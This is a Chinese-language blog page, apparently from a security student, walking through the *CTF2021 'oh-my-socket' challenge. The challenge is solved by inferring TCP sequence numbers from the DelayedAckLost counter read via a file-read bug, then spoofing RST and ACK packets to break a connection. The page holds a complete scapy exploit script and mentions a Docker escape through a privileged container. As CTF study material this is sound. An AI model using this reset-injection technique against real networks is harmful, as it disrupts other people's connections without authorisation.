@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"eifiz.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="*CTF2021里的一道Web题目oh-my-socket是关于TCP侧信道攻击的，个人感觉更像是杂项而不是传统的Web题，记录一下赛后复现的过程以及遇到的一些问题和解决思路。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="*ctf2021 oh-my-socket 复现">
+<meta property="og:url" content="https://eifiz.github.io/2021/02/08/ctf2021-oh-my-socket-%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Eifiz Blog">
+<meta property="og:description" content="*CTF2021里的一道Web题目oh-my-socket是关于TCP侧信道攻击的，个人感觉更像是杂项而不是传统的Web题，记录一下赛后复现的过程以及遇到的一些问题和解决思路。">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-02-08T12:25:08.000Z">
+<meta property="article:modified_time" content="2021-02-08T18:16:58.725Z">
+<meta property="article:author" content="Eifiz">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://eifiz.github.io/2021/02/08/ctf2021-oh-my-socket-%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>*ctf2021 oh-my-socket 复现 | Eifiz Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="تشغيل شريط التصفح">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Eifiz Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>الأرشيفات</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://eifiz.github.io/2021/02/08/ctf2021-oh-my-socket-%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Eifiz">
+      <meta itemprop="description" content="Focus on Cyber Security">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eifiz Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          *ctf2021 oh-my-socket 复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">نُشر في</span>
+
+              <time title="أُنشأ: 2021-02-08 20:25:08" itemprop="dateCreated datePublished" datetime="2021-02-08T20:25:08+08:00">2021-02-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">عُدل في</span>
+                <time title="عُدل: 2021-02-09 02:16:58" itemprop="dateModified" datetime="2021-02-09T02:16:58+08:00">2021-02-09</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>*CTF2021里的一道Web题目oh-my-socket是关于TCP侧信道攻击的，个人感觉更像是杂项而不是传统的Web题，记录一下赛后复现的过程以及遇到的一些问题和解决思路。</p>
+<a id="more"></a>
+
+<h2 id="审计题目"><a href="#审计题目" class="headerlink" title="审计题目"></a>审计题目</h2><p>主办方公开了题目源码以及相关WP在他们的github上面</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sixstars/starctf2021/tree/main/web-oh-my-socket">https://github.com/sixstars/starctf2021/tree/main/web-oh-my-socket</a></p>
+<p>可以发现起了3个容器，分别是webserver，client和server。并且我们拥有：</p>
+<ul>
+<li>webserver上的root权限RCE</li>
+<li>client里的任意文件读取</li>
+</ul>
+<p>在启动的时候，client会绑定一个端口，然后通过tcp主动连接server的一个端口，然后两边互相等待，处于阻塞状态。只要连上了server的该端口，发送<code>*ctf</code>即可得到server的flag。</p>
+<p>所以问题就是断开client和server的链接。</p>
+<p>因为3个容器同属一个内网，所以我们控制的webserver可以伪装client或者server发送tcp包，因为原始TCP协议不会去验证MAC地址。只要我们向client或者server发送一个RST的TCP包那就可以断开他们的连接了，但是前提是sequence字段需要准确。</p>
+<p>所以本题预期解法的重点也就在于通过侧信道方式获取client中的sequence字段，这也是出题人设置了一个client的任意文件读取的意义。</p>
+<p>而在向client发送正确RST包以后，client就会close该链接，然后再向server发送一个rst包即可</p>
+<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>Linux中有一个计数器DelayedAckLost，当系统接收的数据包中的序列号小于预期的序列号时，则认为网络出了问题需要重传，所以这个计数器就加一，而且这个计数器是可以通过文件<code>/proc/net/netstat</code>或者其他的文件如<code>proc/self/net/netstat</code>读取到，所以我们可以通过这种办法来判断发送的序列号是否小于预期序列号，从而在(0, 2^32)的区间里推断出预期序列号。</p>
+<p>因此，采用二分法找出预期序列号即可进行后续攻击。</p>
+<p>另外在测试中可能会发现一个神奇的现象，就是有时采用2^32-1作为序列号的时候计数器居然加一了。这是因为TCP为解决序列号回绕问题，在判断序列号大小的时候不是直接seq1&gt;seq2，而是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* The next routines deal with comparing 32 bit unsigned ints</span></span><br><span class="line"><span class="comment">* and worry about wraparound (automatic with unsigned arithmetic).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">before</span><span class="params">(__u32 seq1, __u32 seq2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (__s32)(seq1-seq2) &lt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> after(seq2, seq1) before(seq1, seq2)</span></span><br></pre></td></tr></table></figure>
+<p>如果2个无符号数seq1减去seq2的差值转换为有符号数后小于0，则证明seq1小于seq2。换句话说，当seq1 - seq2的值足够大，使得第一个bit为1时，那么就认为seq1小于seq2。</p>
+<p>这就会影响到我们通过DelayedAckLost来进行判断序列号大小，因为在这种判断逻辑下，系统会认为2^31+x 小于 y  (y &lt; x &lt; 2^31) 。这就会导致，在我们的预期程序逻辑中，</p>
+<ul>
+<li>当2^31+x为我们发送的seq1时，DelayedAckLost不正确的加一了</li>
+<li>当y为我们发送的seq1时，DelayedAckLost没有正确加一。</li>
+</ul>
+<p>但实际上我们采用二分查找法以后，很难出现2^31+x 与 y的比较，因为第一步比较就会将比较区间缩小到2^31之内了，不太可能出现这种横跨2^31的比较。</p>
+<p>获取到seq以后，即可发送rst包到client，此时client中的链接已被关闭。</p>
+<p>但是我们需要的是server上的链接关闭，所以我们伪造client向server发送一个ack包(seq值不正确)，根据TCP重传机制，server会返回一个ack包给到client，而client发现链接已经关闭，则会返回一个rst包（seq值为server发送的ack包的ack值），使得server上的链接也关闭。</p>
+<p>最后链接到server即可获取flag。</p>
+<p>附上EXP</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendRstPacket</span>(<span class="params">seq</span>):</span></span><br><span class="line">    ip = IP(src=<span class="string">&quot;172.21.0.2&quot;</span>, dst=<span class="string">&quot;172.21.0.3&quot;</span>)</span><br><span class="line">    tcp = TCP(sport=<span class="number">21587</span>, dport=<span class="number">7775</span>, flags=<span class="string">&quot;R&quot;</span>, seq=seq)</span><br><span class="line">    packet = ip / tcp </span><br><span class="line">    <span class="keyword">return</span> send(packet,verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendAckPacket</span>(<span class="params">seq</span>):</span></span><br><span class="line">    ip = IP(src=<span class="string">&quot;172.21.0.2&quot;</span>, dst=<span class="string">&quot;172.21.0.3&quot;</span>)</span><br><span class="line">    tcp = TCP(sport=<span class="number">21587</span>, dport=<span class="number">7775</span>, flags=<span class="string">&quot;A&quot;</span>, seq=seq)</span><br><span class="line">    packet = ip / tcp / <span class="string">&quot;payload&quot;</span></span><br><span class="line">    <span class="keyword">return</span> send(packet,verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendAckPacketToServer</span>(<span class="params">seq</span>):</span></span><br><span class="line">    ip = IP(src=<span class="string">&quot;172.21.0.3&quot;</span>, dst=<span class="string">&quot;172.21.0.2&quot;</span>)</span><br><span class="line">    tcp = TCP(sport=<span class="number">7775</span>, dport=<span class="number">21587</span>, flags=<span class="string">&quot;A&quot;</span>, seq=seq)</span><br><span class="line">    packet = ip / tcp / <span class="string">&quot;payload&quot;</span></span><br><span class="line">    <span class="keyword">return</span> send(packet,verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDelayedAckLost</span>():</span></span><br><span class="line">    r = sess.get(<span class="string">&quot;http://172.21.0.3:5000/file?name=/proc/1/net/netstat&quot;</span>)</span><br><span class="line">    lines = r.text.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    lines[<span class="number">0</span>] = lines[<span class="number">0</span>].split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    lines[<span class="number">1</span>] = lines[<span class="number">1</span>].split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    netstat = &#123;lines[<span class="number">0</span>][i]:lines[<span class="number">1</span>][i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(lines[<span class="number">0</span>])) &#125;</span><br><span class="line">    <span class="keyword">return</span> netstat[<span class="string">&#x27;DelayedACKLost&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binarySearch</span>():</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">0</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">2</span>**<span class="number">32</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">abs</span>(<span class="built_in">max</span> - <span class="built_in">min</span>) &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) // <span class="number">2</span></span><br><span class="line">        counter = getDelayedAckLost()</span><br><span class="line">        sendAckPacket(mid)</span><br><span class="line">        counter_new = getDelayedAckLost()</span><br><span class="line">        <span class="keyword">if</span> counter_new &gt; counter:</span><br><span class="line">            counter = counter_new</span><br><span class="line">            <span class="built_in">min</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">min</span> == <span class="built_in">max</span> <span class="keyword">or</span> <span class="built_in">min</span> == <span class="built_in">max</span>-<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 有时获取到的seq并非正确的值，所以多试几次</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        seq = binarySearch()</span><br><span class="line">        print(seq)</span><br><span class="line">        <span class="comment"># 当获取到的seq为0时。证明上一次获取的值为正确的，也就是已经断开链接，所以break</span></span><br><span class="line">        <span class="keyword">if</span> seq == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            sendRstPacket(seq + i - <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">        sendAckPacketToServer(seq)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tcpCliSock = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">HOST = <span class="string">&#x27;172.21.0.2&#x27;</span></span><br><span class="line">PORT = <span class="number">21587</span></span><br><span class="line">ADDR = (HOST,PORT)</span><br><span class="line">tcpCliSock.settimeout(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    tcpCliSock.connect(ADDR)</span><br><span class="line">    tcpCliSock.send(<span class="string">b&quot;*ctf&quot;</span>)</span><br><span class="line">    data1 = tcpCliSock.recv(<span class="number">1024</span>)</span><br><span class="line">    print(data1.decode())</span><br><span class="line">    tcpCliSock.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">&quot;error&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="题目非预期"><a href="#题目非预期" class="headerlink" title="题目非预期"></a>题目非预期</h2><ol>
+<li>一开始题目设置webserver为<code>privileged:true</code>导致docker逃逸，因此可以直接读到宿主机文件中另一个容器server中的flag。</li>
+<li>虽然client设置了depends_on，但这只能保证client会在server启动后再启动，无法保证在server.py执行以后再执行client.py。因此，依然有可能出现client中发起连接时server还未监听端口的情况，而client只发起一次connect，所以这会导致双方未建立链接，没有进入阻塞，这个时候直接连接server即可getflag。</li>
+<li>因为题目不是每个队伍一个环境，所以如果一直在connect server，那么有可能在别的队伍解除阻塞以后先人一步连上了server。。</li>
+</ol>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
+<li><p><a href="">https://blog.frankli.site/2021/01/18/*CTF-2021-Web/#oh-my-socket</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/ateamjkr/posts/blob/30ee3cc41d9035409281913df4b881a08f4ceac7/ctf/starctf-oh-my-socket-solution.md">https://github.com/ateamjkr/posts/blob/30ee3cc41d9035409281913df4b881a08f4ceac7/ctf/starctf-oh-my-socket-solution.md</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/sixstars/starctf2021/blob/main/web-oh-my-socket/oh-my-socket-ZH.md">https://github.com/sixstars/starctf2021/blob/main/web-oh-my-socket/oh-my-socket-ZH.md</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://docs.docker.com/compose/startup-order/">https://docs.docker.com/compose/startup-order/</a></p>
+</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/12/16/CSAPP-chapter-12/" rel="prev" title="CSAPP十二章阅读笔记">
+      <i class="fa fa-chevron-left"></i> CSAPP十二章阅读笔记
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          المحتويات
+        </li>
+        <li class="sidebar-nav-overview">
+          عام
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1%E9%A2%98%E7%9B%AE"><span class="nav-number">1.</span> <span class="nav-text">审计题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-number">2.</span> <span class="nav-text">预期解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-number">3.</span> <span class="nav-text">题目非预期</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Eifiz</p>
+  <div class="site-description" itemprop="description">Focus on Cyber Security</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">المقالات</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">الوسوم</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Eifiz</span>
+</div>
+  <div class="powered-by">تطبيق الموقع <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
